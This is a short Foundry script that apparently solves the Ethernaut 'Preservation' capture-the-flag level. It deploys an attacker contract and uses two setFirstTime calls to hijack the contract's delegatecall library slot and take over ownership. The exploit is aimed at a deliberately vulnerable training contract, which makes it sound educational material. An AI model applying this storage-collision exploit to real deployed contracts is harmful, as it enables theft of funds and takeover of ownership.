// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../utils/Ethernaut.sol";
import "./Preservation.sol";
import "./PreservationAttacker.sol";

contract PreservationSolver is Test, Ethernaut {
    function run() public {
        IS_TEST = false;
        test();
    }

    function test() public broadcasted {
        Preservation instance = Preservation(getLevelInstance(Levels.preservation));
        PreservationAttacker attacker = new PreservationAttacker();

        instance.setFirstTime(uint256(address(attacker)));
        instance.setFirstTime(1337);

        require(validateLevelInstance(Levels.preservation, address(instance)), "no validation");

        if (!IS_TEST) submitLevelInstance(address(instance));
    }
}
